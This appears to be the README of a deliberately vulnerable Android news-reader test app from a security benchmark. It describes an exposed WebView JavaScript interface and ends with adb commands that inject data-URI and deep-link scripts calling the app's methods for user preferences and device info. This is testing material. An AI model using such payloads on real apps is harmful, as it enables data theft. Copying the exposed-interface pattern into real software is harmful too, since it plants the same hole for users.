# oxo-android-ben41 News Reader App

## Attack Vector 3: JavaScript Interface Exposure with Malicious Content

**Vulnerability**: WebView has JavaScript enabled and exposes Android Java objects to JavaScript, allowing malicious web content to access sensitive app functionality and data.

**Key Issues**:
- `webView.addJavascriptInterface()` used without proper security
- JavaScript interface exposes sensitive methods to web content
- Malicious HTML/JavaScript can call Android methods directly
- Potential for data exfiltration and unauthorized actions

**Difficulty**: High

## Testing

```bash
# Test with external HTML file (not bundled with app)
# First, push your test HTML file to the device:
adb push test_exploit.html /sdcard/test_exploit.html
adb shell am start -n co.ostorlab.myapplication/.ArticleViewerActivity -e url "file:///sdcard/test_exploit.html"

# Test with data URI that contains JavaScript exploitation
adb shell am start -n co.ostorlab.myapplication/.ArticleViewerActivity -e url "data:text/html,<script>alert(NewsReader.getUserPreferences())</script>"

# Test device info extraction via data URI
adb shell am start -n co.ostorlab.myapplication/.ArticleViewerActivity -e url "data:text/html,<script>alert(NewsReader.getDeviceInfo())</script>"

# Test via deep link (most realistic attack vector)
adb shell am start -d "newsreader://article?url=data:text/html,<script>console.log(NewsReader.getUserPreferences())</script>&title=News"
```
